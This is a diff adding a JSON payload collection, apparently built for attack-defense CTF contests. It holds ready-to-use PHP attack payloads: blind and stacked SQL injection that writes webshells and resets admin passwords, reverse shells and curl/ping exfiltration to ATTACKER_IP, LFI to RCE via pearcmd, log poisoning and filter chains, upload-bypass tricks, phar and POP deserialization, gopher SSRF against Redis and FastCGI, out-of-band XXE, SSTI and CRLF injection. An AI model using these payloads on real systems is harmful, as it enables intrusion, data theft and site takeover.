@@ -1,0 +1,164 @@
+{
+ "payloads": [
+  {
+   "id": "payload-php-sqli-blind",
+   "title": "PHP SQL 注入: 布尔 / 时间盲注",
+   "language": "php",
+   "category": "sqli",
+   "description": "无回显时按位判断数据，AWD 里最稳的取数方式；注意先确认是否被 WAF 拦。",
+   "body": "-- 布尔盲注（逐字符）\n' and substr((select database()),1,1)='a'--+\n' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{n},1))>{mid}--+\n-- 时间盲注（MySQL）\n' and if(ascii(substr((select user()),1,1))=114,sleep(3),0)--+\n' or sleep(if(substr((select version()),1,1)='8',3,0))--+\n-- 时间盲注（PG）\n'; select case when (select substr(current_user,1,1))='p' then pg_sleep(3) else pg_sleep(0) end--+\n-- 二分脚本骨架\nlo,hi=32,127\nwhile lo<hi:\n    mid=(lo+hi)//2\n    if blind(f\"ascii(substr(({q}),{n},1))>{mid}\"): lo=mid+1\n    else: hi=mid"
+  },
+  {
+   "id": "payload-php-sqli-stacked",
+   "title": "PHP SQL 注入: 堆叠 / 多语句 / 写文件",
+   "language": "php",
+   "category": "sqli",
+   "description": "PDO 默认不允许多语句，mysqli_query 单次执行；能堆叠时优先写文件而不是拖库。",
+   "body": "-- 探测是否支持堆叠\n1'; select 1--+\n-- MySQL 写 webshell（需 FILE 权限 + secure_file_priv 为空）\n1'; select '<?php @eval($_POST[1]);?>' into outfile '/var/www/html/x.php'--+\n1'; select unhex('3c3f706870...') into dumpfile '/var/www/html/x.php'--+\n-- 读文件\n1' union select load_file('/etc/passwd'),2,3--+\n-- 改管理员密码（AWD 常用）\n1'; update users set password=md5('pwned') where id=1--+\n-- 建账号\n1'; insert into users(username,password) values('pwned',md5('pwned'))--+\n-- PG 命令执行（超级用户）\n1'; copy (select '') to program 'id > /tmp/o'--+"
+  },
+  {
+   "id": "payload-php-rce-system",
+   "title": "PHP 命令执行: 常用执行点与回连",
+   "language": "php",
+   "category": "rce",
+   "description": "system/exec/shell_exec/passthru/popen/proc_open/反引号 逐个试，注意 disable_functions。",
+   "body": "id;whoami;uname -a\nls -la / ; cat /flag* 2>/dev/null; find / -maxdepth 3 -name 'flag*' 2>/dev/null\n# 反弹\nbash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\nnc -e /bin/sh ATTACKER_IP 4444\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f\n# 无回显外带\ncurl http://ATTACKER_IP/`id|base64 -w0`\nping -c1 `id|base64 -w0`.ATTACKER_IP\n# disable_functions 常见替代\npcntl_exec('/bin/sh',['-c','id']);\nputenv('LD_PRELOAD=/tmp/evil.so'); mail('a@b','c','d');\nimap_open('{ATTACKER_IP:143}/x','','');"
+  },
+  {
+   "id": "payload-php-rce-dynamic-call",
+   "title": "PHP 代码执行: 动态函数与回调",
+   "language": "php",
+   "category": "rce",
+   "description": "审计时这类写法最容易被忽略：变量函数、call_user_func、array_map、preg_replace /e、create_function。",
+   "body": "$f=$_GET['f']; $f($_GET['a']);                      // 变量函数\ncall_user_func($_GET['f'], $_GET['a']);\ncall_user_func_array('assert', [$_POST[1]]);\narray_map('system', (array)$_GET['c']);\narray_filter([$_GET['c']], 'assert');\npreg_replace('/.*/e', $_POST[1], '');                 // PHP<7\ncreate_function('', $_POST[1]);                       // PHP<8\nusort($arr, $_GET['cb']);\nregister_shutdown_function($_GET['f']);\nob_start($_GET['f']);\nassert($_POST[1]);                                    // PHP<8 字符串模式\n${'_'.'POST'}[1]($_POST[2]);                          // 变量变量绕过关键字"
+  },
+  {
+   "id": "payload-php-code-eval",
+   "title": "PHP 代码执行: eval / assert / 字符串拼接变形",
+   "language": "php",
+   "category": "rce",
+   "description": "eval 是语言结构不能当回调；关键字被过滤时用拼接、chr、base64_decode 还原。",
+   "body": "eval($_POST[1]);\neval($_POST['a'].$_POST['b']);            // 拆分绕过关键字检测\neval(base64_decode('ZWNobyAxOw=='));\nassert($_REQUEST['c']);\neval(gzinflate(base64_decode('...')));    // 冰蝎/哥斯拉常见外层\n$a='sys'.'tem'; $a('id');\n$f=\"\\x73\\x79\\x73\\x74\\x65\\x6d\"; $f('id');\neval($_GET['x'] ?? ''); // 仅自测用"
+  },
+  {
+   "id": "payload-php-lfi-pearcmd",
+   "title": "PHP 文件包含: pearcmd.php 写马",
+   "language": "php",
+   "category": "lfi",
+   "description": "目标存在 include($_GET[..]) 且 PHP 自带 PEAR 时，无需日志投毒即可写文件。",
+   "body": "# 1) 确认包含生效（register_argc_argv 需开启）\n?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=eval($_POST[1]);?>+/tmp/s.php\n# 2) 常见 pearcmd 路径\n/usr/local/lib/php/pearcmd.php\n/usr/share/php/pearcmd.php\n/usr/lib/php/pearcmd.php\n# 3) 变体（带 config 文件名冲突时换路径）\n?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo();?>+/tmp/a.php\n# 4) 包含落地文件\n?file=/tmp/s.php"
+  },
+  {
+   "id": "payload-php-lfi-phpfilter",
+   "title": "PHP 文件包含: php://filter 链（无落地 RCE）",
+   "language": "php",
+   "category": "lfi",
+   "description": "PHP >= 7 可用 iconv 过滤器链把任意内容变成任意 PHP 代码，绕开对 <? 与写入权限的限制。",
+   "body": "# 生成脚本（php_filter_chain_generator）\npython3 php_filter_chain_generator.py --chain '<?=system($_GET[1]);?>'\n# 结果形如\nphp://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|.../resource=index.php\n# 极简版本（PHP<8 常用，读源码）\nphp://filter/convert.base64-encode/resource=index.php\nphp://filter/read=string.rot13/resource=config.php\n# 只读 + 大写化过滤\nphp://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php"
+  },
+  {
+   "id": "payload-php-lfi-logpoison",
+   "title": "PHP 文件包含: 日志 / 会话 / 临时文件投毒",
+   "language": "php",
+   "category": "lfi",
+   "description": "没有写权限时的经典路径；注意 Apache/Nginx 日志路径与 UA 注入点。",
+   "body": "# 1) UA 投毒 + 包含访问日志\ncurl -A '<?=eval($_POST[1]);?>' http://TARGET/\n?file=/var/log/apache2/access.log\n/var/log/httpd/access_log\n/var/log/nginx/access.log\n/usr/local/nginx/logs/access.log\n# 2) 错误日志\n?file=/var/log/apache2/error.log   （先制造 404 带 payload）\n# 3) SSH 日志\n?file=/var/log/auth.log\n# 4) 会话文件投毒\n?file=/tmp/sess_<PHPSESSID>   （先往 session 里写 payload）\n# 5) /proc 自读\n?file=/proc/self/environ   （UA 注入）\n?file=/proc/self/fd/0"
+  },
+  {
+   "id": "payload-php-session-upload-progress",
+   "title": "PHP 文件包含: session.upload_progress 写临时文件",
+   "language": "php",
+   "category": "lfi",
+   "description": "session.upload_progress.enabled=On 时，上传进度会把可控内容写进 session 文件，配合 LFI 直接 RCE。",
+   "body": "# 1) 构造表单（PHPSESSID 自己指定）\nPOST /upload.php\nCookie: PHPSESSID=pwn\nContent-Type: multipart/form-data; boundary=--\n-- --\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\n<?=eval($_POST[1]);?>\n-- --\nContent-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\nAAAA\n-- -- --\n# 2) 并发包含（脚本要跑起来，否则临时文件被清理）\n?file=/tmp/sess_pwn\n# 3) 常用 session 路径\n/var/lib/php/sessions/sess_pwn\n/tmp/sess_pwn\n/var/lib/php5/sess_pwn\nC:\\Windows\\Temp\\sess_pwn"
+  },
+  {
+   "id": "payload-php-phar-deser",
+   "title": "PHP 反序列化: phar:// 触发点",
+   "language": "php",
+   "category": "deserialization",
+   "description": "文件操作函数（file_exists/stat/filesize/getimagesize/unlink）都会解析 phar 元数据，是隐藏的反序列化入口。",
+   "body": "# 1) 生成恶意 phar（PHP >= 8 需去掉只读标志）\nphp -d phar.readonly=0 -r '$p=new Phar(\"/tmp/x.phar\");$p->startBuffering();\n$p->addFromString(\"a.txt\",\"a\");$p->setStub(\"<?php __HALT_COMPILER(); ?>\");\n$p->setMetadata(new Evil());$p->stopBuffering();'\n# 2) 触发（任意文件函数）\nfile_exists('phar:///tmp/x.phar/a.txt');\n# 3) 上传后把 phar 改名成图片绕过检测\nmv x.phar x.jpg   → phar:///upload/x.jpg/a.txt\n# 4) 绕过 __HALT_COMPILER 检测：加 GIF89a 头\n# 5) 常见链：ThinkPHP / Laravel / Monolog / Guzzle"
+  },
+  {
+   "id": "payload-php-upload-htaccess",
+   "title": "PHP 文件上传: .htaccess / .user.ini 覆盖",
+   "language": "php",
+   "category": "upload",
+   "description": "不能直接传 php 时，先传配置文件让任意扩展名被当 PHP 解析。",
+   "body": "# 1) .htaccess（Apache + AllowOverride All）\nAddType application/x-httpd-php .jpg\n<FilesMatch \".+\">\nSetHandler application/x-httpd-php\n</FilesMatch>\nphp_value auto_append_file /upload/shell.jpg\n# 2) .user.ini（PHP-FPM / CGI，需等 300s 或重启）\nauto_prepend_file=/upload/shell.jpg\n# 3) 覆盖目录索引 / 错误页\nDirectoryIndex shell.jpg\n# 4) 上传后用 .jpg 访问\nGET /upload/shell.jpg?1=system('id');"
+  },
+  {
+   "id": "payload-php-upload-bypass-ext",
+   "title": "PHP 文件上传: 扩展名与解析组合",
+   "language": "php",
+   "category": "upload",
+   "description": "同一份内容，靠文件名 / Content-Type / 头部三处变形命中不同解析器。",
+   "body": "shell.php\nshell.php5 / .php7 / .phtml / .pht / .phar / .inc\nshell.PHP / shell.Php   （大小写）\nshell.php.jpg / shell.jpg.php\nshell.php%00.jpg        （PHP<5.3.4）\nshell.php. .            （Windows 去尾点）\nshell.php::$DATA        （NTFS ADS）\nshell.asp;.jpg          （IIS6）\nshell.jsp;.jpg\n# Content-Type 三连\nContent-Type: image/jpeg  →  image/png  →  text/plain\n# 头部伪造\nGIF89a<?php eval($_POST[1]);?>\n\\xFF\\xD8\\xFF\\xE0<?php eval($_POST[1]);?>"
+  },
+  {
+   "id": "payload-php-ssrf-curl",
+   "title": "PHP SSRF: curl / file_get_contents 协议族",
+   "language": "php",
+   "category": "ssrf",
+   "description": "PHP 支持的 wrapper 比想象多，gopher 能把 SSRF 变成任意 TCP 报文。",
+   "body": "# file_get_contents / fopen\n?url=file:///etc/passwd\n?url=http://127.0.0.1:6379/\n?url=dict://127.0.0.1:6379/info\n?url=ftp://127.0.0.1:21/\n?url=php://filter/convert.base64-encode/resource=index.php\n?url=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+\n# gopher 打 Redis 写 shell\n?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...\n# gopher 打 MySQL / FastCGI（PHP-FPM 9000）\n?url=gopher://127.0.0.1:9000/_%01%01...\n# curl 特有\n?url=file:///flag\n?url=ldap://127.0.0.1:389/%0astats%0aquit"
+  },
+  {
+   "id": "payload-php-xxe-oob",
+   "title": "PHP XXE: 外带与 OOB 读文件",
+   "language": "php",
+   "category": "xxe",
+   "description": "libxml < 2.9 默认解析外部实体；无回显时用 FTP/HTTP 外带。",
+   "body": "# 1) 直接读\n<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>\n# 2) 参数实体 + 外带（无回显）\n<!DOCTYPE r [<!ENTITY % f SYSTEM \"file:///etc/passwd\">\n<!ENTITY % d \"<!ENTITY &#37; o SYSTEM 'http://ATTACKER/?%f;'>\">%d;%o;]>\n# 3) 盲 XXE 走 FTP（避开换行截断）\n<!DOCTYPE r [<!ENTITY % a SYSTEM \"file:///etc/passwd\">\n<!ENTITY % b \"<!ENTITY &#37; c SYSTEM 'ftp://ATTACKER:2121/%a;'>\">%b;%c;]\n# 4) PHP 特有：expect:// 直接命令\n<!DOCTYPE r [<!ENTITY x SYSTEM \"expect://id\">]><r>&x;</r>\n# 5) 读 PHP 源码要 base64 包装\n<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/html/config.php\">"
+  },
+  {
+   "id": "payload-php-deser-pop",
+   "title": "PHP 反序列化: POP 链手写模板",
+   "language": "php",
+   "category": "deserialization",
+   "description": "没有现成链时按 __destruct → __toString → __call 逐步试；先用属性类型混淆造可控对象。",
+   "body": "// 1) 探针：把可控字符串塞进每个魔术方法\nclass P{ public $x; function __destruct(){ file_put_contents('/tmp/hit',get_class($this)); } }\n// 2) 常见入口\n__destruct / __wakeup / __toString / __call / __invoke / __get / __set\n// 3) 属性数量绕过 __wakeup（PHP<7.4）\nO:4:\"Test\":3:{...}   // 声明属性数与实际不符 → __wakeup 不执行\n// 4) 私有属性序列化格式（\u0000类名\u0000属性）\nO:4:\"Test\":1:{s:7:\"\\0Test\\0a\";s:2:\"id\";}\n// 5) 引用复用\na:2:{i:0;O:1:\"A\":0:{}i:1;R:2;}\n// 6) 生成\nphp -r 'echo urlencode(serialize(new Evil()));'"
+  },
+  {
+   "id": "payload-php-type-juggle",
+   "title": "PHP 认证绕过: 弱类型与 Magic Hash",
+   "language": "php",
+   "category": "auth-bypass",
+   "description": "PHP 7 及以前的 == 松散比较是 AWD 送分点；PHP 8 已修，先探版本。",
+   "body": "# 1) Magic Hash（0e 开头纯数字）\n240610708  == '0e462097431906509019562988736854'\nQNKCDZO    == '0e830400451993494058024219903391'\n# 2) 数组绕过 strcmp / in_array\npassword[]=x\n?user=admin&pass[]=1\n# 3) json 布尔 / 数字\n{\"password\":true}   {\"password\":0}\n# 4) 类型混淆（PHP 8 已修）\n\"0\" == \"\"  →  false（PHP8）/ true（PHP7）\n# 5) md5/sha1 对比\n?username[]=1&password[]=2\n# 6) in_array 未开 strict\nrole=0   →  in_array(0, ['admin','user']) === true"
+  },
+  {
+   "id": "payload-php-ssti-twig",
+   "title": "PHP SSTI: Twig / Smarty / Blade",
+   "language": "php",
+   "category": "ssti",
+   "description": "Twig 3.x 与 Smarty 3 的过滤器链都能直达 RCE，先做算术探测再上链。",
+   "body": "# Twig 探测\n{{7*7}}   {{7*'7'}}\n# Twig 1.x / 2.x\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n{{['id']|filter('system')}}\n{{['id',0]|map('system')|join}}\n# Twig 3.x（filter 被限制时）\n{{['id']|map('passthru')}}\n{{app.request.server.all|join(',')}}\n# Smarty\n{php}echo `id`;{/php}\n{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php eval($_POST[1]);?>\",self::clearConfig())}\n{system('id')}\n# Blade\n{{ system('id') }}\n@php system('id'); @endphp"
+  },
+  {
+   "id": "payload-php-var-export",
+   "title": "PHP 信息泄露: 调试函数与报错",
+   "language": "php",
+   "category": "info-leak",
+   "description": "AWD 里读配置（数据库口令、flag 路径）比拿 shell 更快。",
+   "body": "?debug=1  →  phpinfo();  var_dump($_SERVER);  print_r($GLOBALS);\n# 常见泄露点\n/phpinfo.php  /info.php  /test.php  /.env  /config.php.bak  /www.zip\n/.git/config  /.svn/entries  /composer.json  /composer.lock\n# 报错泄露绝对路径\n' and extractvalue(1,concat(0x7e,(select @@basedir)))--+\n# 通过 var_dump 打对象属性\n?obj[]=1  →  TypeError 里带类型与文件行号\n# ThinkPHP 调试\n/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
+  },
+  {
+   "id": "payload-php-wrappers-data",
+   "title": "PHP 伪协议: data:// / expect:// / zip://",
+   "language": "php",
+   "category": "lfi",
+   "description": "allow_url_include=On 时 data:// 直接执行；zip:// 可绕过扩展名检测。",
+   "body": "# data://\n?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+\n?file=data:text/plain,<?=system('id');?>\n# expect://（需 expect 扩展）\n?file=expect://id\n# zip:// / phar://（上传 zip 后包含内部文件）\n?file=zip:///upload/x.zip%23shell.php\n?file=phar:///upload/x.zip/shell.php\n# compress.zlib://\n?file=compress.zlib:///upload/x.gz\n# 组合：先 base64 再 zlib\n?file=php://filter/zlib.inflate/resource=/upload/x.zlib"
+  },
+  {
+   "id": "payload-php-header-crlf",
+   "title": "PHP CRLF 注入 / 响应拆分",
+   "language": "php",
+   "category": "crlf",
+   "description": "header() 拼接用户输入时可注入响应头，用于 Set-Cookie 提权或 XSS。",
+   "body": "?url=%0d%0aSet-Cookie:%20role=admin\n?url=%0a%0d%0a<script>alert(1)</script>\n?url=//evil.com%0d%0aLocation:%20//evil.com\n# 编码变体\n%0d%0a  %0a  %0d  %E5%98%8A%E5%98%8D  （UTF-8 过宽字符）\n# 常见注入点\nheader(\"Location: \".$_GET['next']);\nsetcookie(\"ref\", $_GET['ref']);\nmail($to,$sub,$body,\"From: \".$_GET['from']);"
+  }
+ ]
+}
